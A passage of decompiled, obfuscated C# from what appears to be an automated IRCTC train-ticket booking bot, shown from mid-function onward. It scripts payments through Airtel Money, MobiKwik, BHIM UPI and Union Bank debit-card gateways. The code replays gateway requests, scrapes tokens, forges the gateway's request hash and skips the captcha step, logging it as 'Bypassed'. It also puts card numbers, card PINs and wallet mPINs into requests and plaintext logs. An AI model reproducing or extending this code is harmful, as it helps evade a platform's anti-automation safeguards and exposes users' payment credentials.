                        if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_3);
                            A_5 = "AirtelMoney Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_4);
                        if (string_4.Contains("Transaction Successful"))
                        {
                            break;
                        }
                        if (string_4.Contains("Please input correct OTP"))
                        {
                            continue;
                        }
                        A_5 = "Payment Failed Airtel Money.";
                        clsMain.Lock("FINAL Hit Failed Invalid response. err = " + A_5);
                        return false;
                    }
                    A_4 = "https://www.irctc.co.in/eticketing/BankResponse?encdata=" + HttpUtility.UrlEncode(GetString(string_4, "encdata").Trim());
                    clsMain.Lock("Success AirtelMoney URL=" + A_4);
                    A_5 = string_;
                    return true;
                }
            }
            catch (Exception)
            {
                num = 0;
            }
            finally
            {
                bool_39 = false;
                string_69 = "";
            }
            return num != 0;
        }

        private string smethod_32(int A_0)
        {
            GClass5 gClass = new GClass5();
            gClass.object_0 = new Random();
            return new string(Enumerable.Repeat("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", A_0).Select(gClass.method_0).ToArray());
        }

        internal bool AirtelMoney(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_89 = "";
            string_90 = "";
            string_69 = "";
            clsMain.Lock("Enter ProcessAirtelMoney.");
            bool flag = !string_86.Contains("airtel");
            string text = "";
            bool result;
            if (flag)
            {
                string_90 = "Some thing went wrong with AirtelMoney Payment";
                clsMain.Lock("Html doesn't contains AirtelMoney, returning.");
                result = false;
            }
            else
            {
                while (true)
                {
                    string_89 = "";
                    string string_91 = class3_0.string_70;
                    string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                    string text2 = array[0].Trim();
                    string text3 = array[1];
                    string string_92 = "";
                    text = "AIRTEL" + text2;
                    string text4 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                    CookieContainer cookieContainer_ = null;
                    string string_93 = "";
                    string string_94 = "";
                    int num2 = 0;
                    int num3 = 0;
                    string text5 = "";
                    string text6 = "";
                    try
                    {
                        while (clsMain.list_7.Contains(text))
                        {
                            Thread.Sleep(300);
                            Application.DoEvents();
                        }
                        clsMain.list_7.Add(text);
                        string text7 = text4.Substring(text4.IndexOf("encdata=") + 8);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "AirtelMoney Not Working - Payment Failed";
                            result = false;
                            break;
                        }
                        string_91 = "https://ecom.airtelbank.com/irctc/";
                        clsMain.Lock("Airtel DETAILS: ");
                        string text8 = "ECOM" + smethod_32(11);
                        string_92 = string_91 + "initiateEcom.action";
                        text4 = "{\"encdata\":\"" + text7 + "\", \"merchantUIId\": \"irctc\",\"feSessionId\":\"" + text8 + "\"}";
                        bool_36 = true;
                        clsMain.Lock("First Hit Inp = " + text4);
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "AirtelMoney Not Working - Payment Failed";
                            result = false;
                            break;
                        }
                        clsMain.Lock("First Output htm = " + string_94);
                        if (!string_94.Contains("convenienceCharges") && num2 == 0)
                        {
                            clsMain.Lock("valid HTML, rehiting once more");
                            result = false;
                            break;
                        }
                        if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("convenienceCharges"))
                        {
                            bool_39 = true;
                            double result2 = 0.0;
                            double result3 = 0.0;
                            double.TryParse(method_140(string_94, "amount").Trim(), out result2);
                            double.TryParse(method_140(string_94, "convenienceCharges").Trim(), out result3);
                            result2 += result3;
                            string text9 = "Airtel";
                            string_69 = method_140(string_94, "token");
                            bool flag2 = method_140(string_94, "SUCCESS").ToUpper() == "OTP";
                            while (true)
                            {
                                object obj2;
                                if (!flag2)
                                {
                                    num3 = 1;
                                    clsMain.Lock("Second Hit OTP Required");
                                    string_92 = string_91 + "ecomSendOtp.action";
                                    text8 = "ECOM" + smethod_32(11);
                                    object obj = "{\"feSessionId\":\"" + text8 + "\",\"customerId\":\"" + text2 + "\"}";
                                    obj = "{\"feSessionId\":\"" + text8 + "\",\"channel\":\"ANDROID\",\"mpin\":\"" + text3 + "\",\"customerId\":\"" + text2 + "\"}";
                                    updateTStatus_2?.Invoke(1002, text9 + "||" + obj, "");
                                    obj2 = new object();
                                    object obj3 = obj2;
                                    lock (obj3)
                                    {
                                        if (clsMain.dictionary_5.ContainsKey(text9))
                                        {
                                            string_68 = clsMain.dictionary_5[text9];
                                            clsMain.Lock("Encrypted Data, out = " + string_68);
                                            clsMain.dictionary_5.Remove(text9);
                                        }
                                    }
                                    text4 = string_68;
                                    clsMain.Lock("OTP Hit Inp = " + text4);
                                    clsMain.string_71 = "x-access-token#" + string_69;
                                    if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                                    {
                                        clsMain.Lock("OTP Hit Failed. err = " + string_93);
                                        string_90 = "AirtelMoney Not Working - Payment Failed";
                                        result = false;
                                        break;
                                    }
                                    clsMain.Lock("OTP Output htm = " + string_94);
                                    text5 = method_140(string_94, "verificationToken");
                                    if (text5.Length <= 5)
                                    {
                                        string_90 = "Do 1 txn on IRCTC directly. Airtel required OTP";
                                        clsMain.Lock("Second Hit Failed Invalid response. err = " + string_90);
                                        result = false;
                                        break;
                                    }
                                    if (clsMain.dictionary_5.ContainsKey(text2))
                                    {
                                        text6 = clsMain.dictionary_5[text2];
                                        clsMain.Lock("Encrypted Data, out = " + text6);
                                        clsMain.dictionary_5.Remove(text2);
                                    }
                                    else
                                    {
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "AIRTELMONEY", class3_0.BANKSAVEAS);
                                        if (frmOTP.DialogResult != DialogResult.OK)
                                        {
                                            clsMain.Lock("OTP Cancel");
                                            updateTStatus_2.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                                            result = false;
                                            break;
                                        }
                                        text6 = frmOTP.string_0;
                                        frmOTP.Dispose();
                                    }
                                }
                                bool flag3 = num3 != 0;
                                text8 = "ECOM" + smethod_32(11);
                                string text10 = ((!flag3) ? ("{\"ver\":\"1.0\",\"languageId\":\"001\",\"feSessionId\":\"" + text8 + "\",\"secondFactorType\":\"NOAUTH\",\"value\":\"\",\"channel\":\"ANDROID\",\"verificationToken\":\"\",\"promoCode\":\"\",\"blockId\":\"\",\"cashBack\":\"\"}") : ("{\"ver\":\"1.0\",\"languageId\":\"001\",\"feSessionId\":\"" + text8 + "\",\"secondFactorType\":\"OTP\",\"otp\":\"" + text6 + "\",\"channel\":\"ANDROID\",\"verificationToken\":\"" + text5 + "\",\"promoCode\":\"\",\"blockId\":\"\",\"cashBack\":\"\"}"));
                                updateTStatus_2?.Invoke(1002, text9 + "||" + text10, "");
                                obj2 = new object();
                                object obj4 = obj2;
                                lock (obj4)
                                {
                                    if (clsMain.dictionary_5.ContainsKey(text9))
                                    {
                                        string_68 = clsMain.dictionary_5[text9];
                                        clsMain.Lock("Encrypted Data, out = " + string_68);
                                        clsMain.dictionary_5.Remove(text9);
                                    }
                                }
                                text4 = string_68;
                                bool_36 = true;
                                string_92 = "https://ecom.airtelbank.com/irctc/ecomVerifyOtp.action";
                                clsMain.Lock("Third Hit Inp = " + text4);
                                clsMain.string_71 = "x-access-token#" + string_69;
                                if (_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                                {
                                    clsMain.Lock("Third Output htm = " + string_94);
                                    if (!string_94.Contains("token"))
                                    {
                                        goto IL_0b5c;
                                    }
                                    string_69 = method_140(string_94, "token");
                                    text8 = method_140(string_94, "feSessionId");
                                    object obj5 = "{\"ver\":\"1.0\",\"languageId\":\"001\",\"feSessionId\":\"" + text8 + "\",\"secondFactorType\":\"mPIN\",\"value\":\"" + text3 + "\",\"channel\":\"ANDROID\",\"verificationToken\":\"" + text5 + "\",\"promoCode\":\"\",\"blockId\":\"\",\"cashBack\":\"\"}";
                                    updateTStatus_2?.Invoke(1002, text9 + "||" + obj5, "");
                                    obj2 = new object();
                                    object obj6 = obj2;
                                    lock (obj6)
                                    {
                                        if (clsMain.dictionary_5.ContainsKey(text9))
                                        {
                                            string_68 = clsMain.dictionary_5[text9];
                                            clsMain.Lock("Encrypted Data, out = " + string_68);
                                            clsMain.dictionary_5.Remove(text9);
                                        }
                                    }
                                    text4 = string_68;
                                    string_92 = "https://ecom.airtelbank.com/irctc/ecomDoTxn.action";
                                    clsMain.Lock("Third Hit Inp = " + text4);
                                    clsMain.string_71 = "x-access-token#" + string_69;
                                    if (_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                                    {
                                        clsMain.Lock("Third Output htm = " + string_94);
                                        if (!string_94.Contains("Transaction Successful"))
                                        {
                                            if (!string_94.Contains("Please input correct OTP"))
                                            {
                                                string_90 = "Payment Failed Airtel Money.";
                                                clsMain.Lock("FINAL Hit Failed Invalid response. err = " + string_90);
                                                result = false;
                                                break;
                                            }
                                            continue;
                                        }
                                        string_89 = "https://www.irctc.co.in/eticketing/BankResponse?encdata=" + HttpUtility.UrlEncode(method_140(string_94, "encdata").Trim());
                                        clsMain.Lock("Success AirtelMoney URL=" + string_89);
                                        string_90 = string_91;
                                        result = true;
                                        break;
                                    }
                                    clsMain.Lock("Third Hit Failed. err = " + string_93);
                                    string_90 = "AirtelMoney Not Working - Payment Failed";
                                    result = false;
                                    break;
                                }
                                clsMain.Lock("Third Hit Failed. err = " + string_93);
                                string_90 = "AirtelMoney Not Working - Payment Failed";
                                result = false;
                                break;
                            }
                            break;
                        }
                        goto IL_0b5c;
                    }
                    catch (Exception ex)
                    {
                        clsMain.method_74("AirtelMoney", ex.Message);
                        num = 0;
                        goto IL_0b5c;
                    }
                    finally
                    {
                        if (clsMain.list_7.Contains(text))
                        {
                            clsMain.list_7.Remove(text);
                        }
                        bool_39 = false;
                        string_69 = "";
                    }
                IL_0b5c:
                    result = num != 0;
                }
                if (clsMain.list_7.Contains(text))
                {
                    clsMain.list_7.Remove(text);
                }
            }
            return result;
        }

        internal bool MobiKwikPay(string A_1, string A_2, string A_3, string A_4, ref string A_5, ref string A_6, UpdateTStatus A_7)
        {
            bool result = false;
            A_5 = "";
            A_6 = "";
            string text = "";
            A_3 = A_3.ToUpper();
            response = A_1;
            bool flag = !A_1.Contains("razorpay");
            string text2 = A_3;
            string text3 = "";
            string string_ = class3_0.string_18;
            string[] array = A_2.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text4 = array[0].Trim();
            string text5 = array[1];
            string text6 = "";
            string text7 = "";
            string text8 = "";
            string text9 = "";
            string text10 = "";
            string text11 = "";
            string text12 = "";
            if (A_3.Contains("_DC") || A_3.Contains("_CC"))
            {
                text3 = "DC";
                text6 = array[2];
                text8 = array[3];
                text7 = array[4];
                text9 = array[6];
                text10 = array[7];
                if (text5.Length < 2)
                {
                    text5 = "0" + text5;
                }
                if ((text2 == "HDFC_DC") | text2.Contains("HDFC_CC"))
                {
                    text12 = "21";
                }
                else if ((text2 == "SBI_DC") | text2.Contains("SBI_CC"))
                {
                    text12 = "101";
                }
                else if (text2.Contains("AIRTEL_CC"))
                {
                    text12 = "102";
                }
                else if (text2.Contains("KOTAK_"))
                {
                    text12 = "KOTAK_DC";
                }
            }
            else if (A_3.Contains("BHIMUPI"))
            {
                text3 = "BHIMUPI";
            }
            else if (A_3.Contains("MOBIKWIK_"))
            {
                text3 = "wallet";
            }
            else
            {
                text3 = "NB";
                switch (text2)
                {
                    case "HDFC":
                        text2 = "HDFC";
                        text12 = "36";
                        break;
                    case "SBI":
                        text2 = "SBI";
                        text12 = "1";
                        break;
                    case "ICICI":
                        text2 = "ICICI";
                        text12 = "44";
                        break;
                    case "UNION":
                        text2 = "UNI";
                        text12 = "28";
                        break;
                    case "IDBI":
                        text2 = "IDBI";
                        text12 = "52";
                        break;
                    case "CORP":
                        text2 = "CORP";
                        text12 = "56";
                        break;
                    case "Razor":
                        text2 = "PPI";
                        break;
                }
            }
            try
            {
                url = "https://walletapi.mobikwik.com/wallet";
                if (response.IndexOf("encdata") > 0)
                {
                    string text13 = response.Substring(response.IndexOf("amount") + 9);
                    text = text13.Substring(0, text13.IndexOf("\""));
                    string text14 = response.Substring(response.IndexOf("encdata") + 18);
                    string text15 = text14.Substring(0, text14.IndexOf("\""));
                    postdata = "encdata=" + text15;
                    url = "https://walletapi.mobikwik.com/securewallet";
                }
                else
                {
                    string text16 = A_1.Substring(A_1.IndexOf("POST_DATA"));
                    text16 = text16.Substring(text16.IndexOf("{") + 1);
                    text16 = text16.Substring(0, text16.IndexOf("}") - 1);
                    text16 = text16.Replace("\":", "=").Replace(",", "&");
                    postdata = text16.Replace("\\\"", "").Replace("\\", "").Replace("\"", "");
                    if (bool_37)
                    {
                        return false;
                    }
                    string text17 = A_1.Substring(A_1.IndexOf("POST_URL") + 19);
                    text17 = (url = text17.Substring(0, text17.IndexOf("\"")));
                }
                response = SetVairalbleintoString(url, postdata);
                bool flag2 = false;
                flag2 = response.IndexOf("https://secure.ccavenue.com/transaction/transaction.do") > 0;
                if (flag2)
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                    if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                bool flag3 = false;
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(1/6)", tCntrlName_, null, null);
                }
                string text18 = text12;
                string text19 = text18;
                if (!(text19 == "1"))
                {
                    if (text19 == "KOTAK_DC")
                    {
                        flag3 = true;
                        if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            flag3 = false;
                        }
                    }
                }
                else
                {
                    if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    CookieContainer cookieContainer_ = null;
                    flag3 = SbiNetBanking(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, A_4, ref response, ref A_6, A_7, ref cookieContainer_);
                }
                if (!flag3)
                {
                    return false;
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(2/6)", tCntrlName_, null, null);
                }
                if (flag2)
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                    if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (clsMain.isAPP)
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                    if (!_Request(url, postdata, reff, webProxy_3, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                if (response.Contains("https://www.irctc.co.in/eticketing/mbi/"))
                {
                    A_6 = url;
                    A_5 = response;
                    result = true;
                }
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        internal bool method_134(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter Process Bhim_UpI.");
            bool flag = string_86.Contains("pingupi.axisbank.co.in");
            bool result = false;
            if (flag)
            {
                string_89 = "";
                string string_91 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
                string text = string_87.Split(new string[1] { "||" }, StringSplitOptions.None)[0].Trim();
                string string_92 = "";
                string text2 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                string text3 = "https://pingupi.axisbank.co.in/WebCollectRequestIRCTC/";
                try
                {
                    clsMain.Lock("First Hit Inp = " + text2);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(1/4)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "AirtelMoney Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    string_91 = string_92;
                    string_92 = text3 + "MerchantCollectRequest";
                    text2 = "vpa=" + text;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(2/4)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "AirtelMoney Not Working - Payment Failed";
                        return false;
                    }
                    string text4 = string_94.Substring(string_94.IndexOf("var $token") + 14);
                    text4 = text4.Substring(0, text4.IndexOf("\""));
                    string text5 = string_94.Substring(string_94.IndexOf("var $redirectionURL") + 23);
                    text5 = text5.Substring(0, text5.IndexOf("'"));
                    string_92 = text3 + "CheckStatus";
                    bool_36 = true;
                    int num2 = 1;
                    DateTime dateTime = DateTime.Now.AddSeconds(62.0);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(3/4)", tCntrlName_, null, null);
                    }
                    ThreadPool.QueueUserWorkItem(method_18, class3_0.BANKDETAILS + "||True||5||0000000000");
                    do
                    {
                        Thread.Sleep(3000);
                        if (DateTime.Now > dateTime)
                        {
                            break;
                        }
                        text2 = "tokenId=" + text4 + "&count=" + num2;
                        _Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0);
                        num2++;
                    }
                    while (string_94.Contains("0"));
                    if (string_94.Contains("0"))
                    {
                        clsMain.Lock("Getting payment out error= " + string_94);
                        return false;
                    }
                    string_92 = text3 + text5;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(4/4)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "AirtelMoney Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("Third Output htm = " + string_94);
                    if (!string_94.Contains("www.irctc.co.in/eticketing/BankResponse"))
                    {
                        string_90 = "Payment Failed Airtel Money.";
                        clsMain.Lock("FINAL Hit Failed Invalid response. err = " + string_90);
                        return false;
                    }
                    string_89 = string_94;
                    string_90 = string_91;
                    return true;
                }
                catch (Exception)
                {
                    num = 0;
                }
                return num != 0;
            }
            return result;
        }

        private void method_18(object object_18)
        {
            string[] array = object_18.ToString().Split(new string[1] { "||" }, StringSplitOptions.None);
            if (clsMain.string_75 != array[0])
            {
                clsMain.string_75 = array[0];
                method_19(object_18);
            }
        }

        private void method_19(object object_18)
        {
            string text = object_18.ToString();
            if (text != "")
            {
                text.Split(new string[1] { "||" }, StringSplitOptions.None);
            }
            if (!clsMain.bool_47)
            {
                try
                {
                    clsMain.bool_47 = true;
                    string text2 = Strings.Replace(clsMain.string_44, " ", "^#^") + " ";
                    Program.Main(new string[2] { text2, text });
                }
                catch (Exception)
                {
                }
                clsMain.bool_47 = false;
            }
        }

        internal bool method_135(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessUnionDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[3];
                string text5 = array[4];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "UNION Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("paymentId"))
                    {
                        string text7 = "ECB";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId\"", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text8);
                        clsMain.Lock("Get Encrypted Data, inp = " + text8 + "||" + text7 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                        text = Class12.smethod_17(text, text8);
                        text2 = Class12.smethod_17(text2, text8);
                        text5 = Class12.smethod_17(text5, text8);
                        string text13 = Class12.smethod_17(text3, text8);
                        string text14 = Class12.smethod_17(text4, text8);
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for Union Debit.", tCntrlName_, null, null);
                        }
                        clsMain.Lock("Loading Captcha, Not required, Bypassed");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for UNION Debit.", tCntrlName_, null, null);
                        }
                        string text15 = "AE8D5";
                        string text16 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                        string string_95 = text8 + text9 + text + text2 + "A" + text5 + text15 + "0" + text16 + text11 + "file:////fss50/axisbank/Config/ipay/instupd/14/INSTITUTION/CSS/style.css/fss50/axisbank/Config/ipay/instupd/14/INSTITUTION/Header/UBI.jpg//fss50//axisbank//Config//ipay//instupd//14//INSTITUTION//PropFile//label.propertiesIRCTC CRIShttps://www.irctc.co.in" + text12 + "01000" + 0 + "Union Bank of Indiahttps://www.irctc.co.in/eticketing/BankResponse0036140143614000" + text13 + "D" + text14 + "//fss50//PGWAYF//config////brands//default///footer.html";
                        string string_96 = Class12.smethod_22(text10).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text8 + "&hdndivType=&encCaptcha=" + text9.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text10 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text15 + "&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&paymentId=" + text11 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F14%2FINSTITUTION%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F14%2FINSTITUTION%2FHeader%2FUBI.jpg&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Finstupd%2F%2F14%2F%2FINSTITUTION%2F%2FPropFile%2F%2Flabel.properties&mrchName=IRCTC+CRIS&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text12 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=0&ecomFlg=0&captchaFlg=" + 0 + "&instName=Union+Bank+of+India&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=36140&instId=14&mrchId=36140&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text13 + "&creditDebitCheck=D&debitYear=" + text14 + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2F%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/pgwayf/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/pgwayf/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        int num = (string_94.Substring(startIndex, length).ToUpper().Contains("NOT") ? 1 : 0);
                        if (num != 0)
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessUnionDebit isPaymentFailed = " + num);
                        string_89 = string_94;
                        string_90 = string_92;
